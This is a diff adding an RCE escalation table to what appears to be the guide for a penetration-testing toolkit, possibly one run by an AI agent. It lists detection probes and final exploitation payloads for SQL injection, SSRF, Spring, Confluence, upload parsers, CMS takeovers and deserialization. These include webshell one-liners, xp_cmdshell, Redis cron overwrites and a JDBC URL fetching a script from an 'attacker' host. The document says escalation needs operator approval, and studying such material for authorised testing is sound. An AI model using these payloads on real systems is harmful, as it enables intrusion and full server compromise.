@@ -228,6 +228,45 @@ Impact: Stored XSS for all users without persistence vector (HIGH-CRITICAL)
 Impact: Cloud account compromise (CRITICAL)
 ```
 
+## RCE Escalation Reference (detection table)
+
+When an entry-class finding is confirmed, the following pivots can reach RCE. **This is a planning table — DO NOT auto-execute the escalation step.** Detection probes live in `rce_detection.json`. Real exploitation is operator-supervised (Copilot mode): map the chain, save the entry finding with `chain_with[]` referencing the RCE pivot, and ask the operator before firing the destructive payload.
+
+| Entry vuln | Pivot probe (detection) | Final RCE step (operator) | Bar |
+|---|---|---|---|
+| SQLi (MySQL) | `LOAD_FILE('/etc/hostname')` returns string + `@@secure_file_priv` empty | `INTO OUTFILE '<webroot>/shell.php'` | FILE priv + writable webroot |
+| SQLi (PostgreSQL) | `rolsuper=true` OR `pg_execute_server_program` role | `COPY ... FROM PROGRAM 'cmd'` | superuser or PG≥11 role |
+| SQLi (MSSQL) | `IS_SRVROLEMEMBER('sysadmin')=1` | `EXEC xp_cmdshell 'cmd'` (re-enable via sp_configure if off) | sysadmin |
+| SQLi (Oracle) | `EXECUTE on DBMS_SCHEDULER` count>0 | `dbms_scheduler.create_job` with executable | DBMS_SCHEDULER grant |
+| SQLi (SQLite) | `sqlite_version()` returns version | `SELECT load_extension('/tmp/evil.so')` | load_extension compiled in |
+| SSRF | Gopher Redis `INFO` returns `redis_version` | Gopher Redis `SET dir /var/spool/cron && SET file /etc/crontab && CONFIG REWRITE` | Redis reachable + writable cron |
+| SSRF | Memcached `stats` returns STAT pid | Cache-key poisoning where app evals cached blob | App reads cache into eval sink |
+| SSRF | Elasticsearch `/_cluster/settings` shows `script.allowed_types: inline` | Painless script with `Runtime.getRuntime().exec` | Dynamic scripting on |
+| SSRF | Jolokia `/list` returns `Runtime` MBean | POST `/jolokia/exec/<MBean>/exec` | /exec endpoint enabled |
+| Spring Boot Actuator | POST `/env` returns 200 with echo + `/restart` returns 405 | POST `eureka.client.serviceUrl` attacker URL → `/refresh` → `/restart` | env writable + restart wired |
+| Spring4Shell | `class.module.classLoader.resources=` reflected / 400 with classLoader trace | classLoader.URLs[0] AccessLogValve → tomcatwar.jsp | Tomcat + nested binding |
+| Spring Cloud Function | header `routing-expression: T(System).currentTimeMillis()` → timing delta | `T(Runtime).getRuntime().exec(...)` | SCF ≤3.2.2 |
+| Spring Cloud Gateway | POST `/actuator/gateway/routes` with `#{1+1}` returns header `X-Probe: 2` | SpEL `T(Runtime).getRuntime().exec` in filter | actuator+gateway exposed |
+| Confluence OGNL | URL path `${100+200}` reflects `300` | `${@Runtime@getRuntime().exec("id")}` | CVE-2022-26134 / 2023-22515 unpatched |
+| Apache OFBiz | `groovyProgram=throw new Exception(100+200)` returns `Exception: 300` | `Runtime.getRuntime().exec` Groovy | OFBiz pre-patch |
+| ImageMagick upload | MVG with `label:swktest-MARKER` reflects in response | `msl:/dev/random` or shell via coder bypass | policy.xml permissive |
+| libwebp upload | server returns/processes WebP + version ≤1.3.1 | Crafted Huffman table (CVE-2023-4863) | libwebp <1.3.2 |
+| Ghostscript upload | tiny PostScript with title processes; gs version exposed | -dSAFER bypass / pipe-from-OutputFile | gs ≤9.27 (or 10.x pre-patch) |
+| ExifTool upload | DjVu chunk parses (response contains DjVu metadata) | CVE-2021-22204 Perl eval in DjVu ANT chunk | exiftool <12.24 |
+| H2 console exposed | `/h2-console` returns 200 with login form | JDBC URL with `INIT=RUNSCRIPT FROM http://attacker/exec.sql` | h2-console exposed (CVE-2021-42392) |
+| WordPress admin ATO | `/wp-admin/theme-editor.php` returns 200 | Write `<?php system($_GET['c']); ?>` to theme/header.php | admin + DISALLOW_FILE_EDIT=false |
+| Joomla admin ATO | `/administrator?option=com_templates` returns editor | PHP write to template | admin role |
+| Drupal admin ATO | `/admin/modules` lists "PHP filter" | Node with PHP input format | PHP filter enabled (D7) |
+| Mass-assignment → admin | `role=admin` accepted on signup | Admin file/template editor write | admin endpoint reachable |
+| OAuth ATO → admin | `redirect_uri` bypass → admin session | Admin upload/template editor | admin role obtained |
+| Prototype pollution | `__proto__.X` reflected in subsequent response | Template engine gadget chain (EJS/pug/lodash) | Server-side merge into prototype |
+| File upload bypass → webshell | Extension/MIME/double-ext bypass confirmed | Upload .jsp/.aspx/.php with `<?php system($_GET['c']); ?>` | Upload reachable + executable path |
+| Deserialization | Class allowlist absent (status=500 with `ClassNotFoundException` on benign gadget) | ysoserial CommonsBeanutils / Log4Shell JNDI | Vulnerable dependency present |
+| SSTI | `${100+200}` → 300 OR `{{7*7}}` → 49 | `T(Runtime).getRuntime().exec` / `__import__('os').system` | Engine-specific RCE class |
+| Command injection | `; sleep 5` triggers timing delta | OS command via shell metacharacter | Shell-exec sink |
+
+**Operator handshake required for the right column.** When the toolkit's `assess_finding` reports an entry-class detection with a known pivot in this table, save with `vuln_type='potential_rce'`, attach the pivot as a finding-note, and prompt the operator before executing column 3. Auto-exploitation is OFF.
+
 ## Severity of a chain
 
 A chain's severity = **the highest-impact step's severity**, NOT the sum.
